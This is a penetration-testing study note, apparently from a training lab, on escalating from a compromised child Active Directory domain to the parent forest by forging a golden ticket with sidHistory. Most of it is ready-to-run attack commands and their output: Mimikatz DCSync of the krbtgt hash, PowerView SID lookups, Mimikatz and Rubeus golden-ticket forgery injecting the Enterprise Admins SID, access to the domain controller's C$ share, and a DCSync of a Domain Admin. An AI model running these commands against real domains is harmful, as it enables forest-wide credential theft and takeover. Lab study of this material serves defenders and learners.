Forging golden tickets and using them to access resources
on parent domain from child domain
You have Repuplication priv or admin on child domain

This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) property is respected due to a lack of [SID Filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the `Enterprise Admins group` (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the `SIDHistory` to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.

To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.
```powershell-session
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

```powershell-session
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. We could also do this with the [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet with a command such as `Get-ADGroup -Identity "Enterprise Admins" -Server "blackwood.local"`.

#### Obtaining Enterprise Admins Group's SID using Get-DomainGroup

Attacking Domain Trusts - Child -> Parent Trusts - from Windows

```powershell-session
PS C:\htb> Get-DomainGroup -Domain blackwood.local -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid                                    
-----------------                                       ---------                                    
CN=Enterprise Admins,CN=Users,DC=BLACKWOOD,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```
At this point, we have gathered the following data points:

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`
- The FQDN of the child domain: `LOGISTICS.BLACKWOOD.local`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

Before the attack, we can confirm no access to the file system of the DC in the parent domain.
#### Creating a Golden Ticket with Mimikatz
```powershell-session
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.BLACKWOOD.local /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

or using rubueas
```powershell-session
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.BLACKWOOD.local /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
#### Confirming a Kerberos Ticket is in Memory Using klist

```powershell-session
PS C:\htb> klist

Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.BLACKWOOD.local
        Server: krbtgt/LOGISTICS.BLACKWOOD.local @ LOGISTICS.BLACKWOOD.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)
        Renew Time: 3/25/2032 19:59:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 
```
#### Listing the Entire C: Drive of the Domain Controller

```powershell-session
PS C:\htb> ls \\dc01.blackwood.local\c$
```

Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the `lab_adm` Domain Admin user.

```powershell-session
mimikatz # lsadump::dcsync /user:BLACKWOOD\lab_adm /domain:blackwood.local
```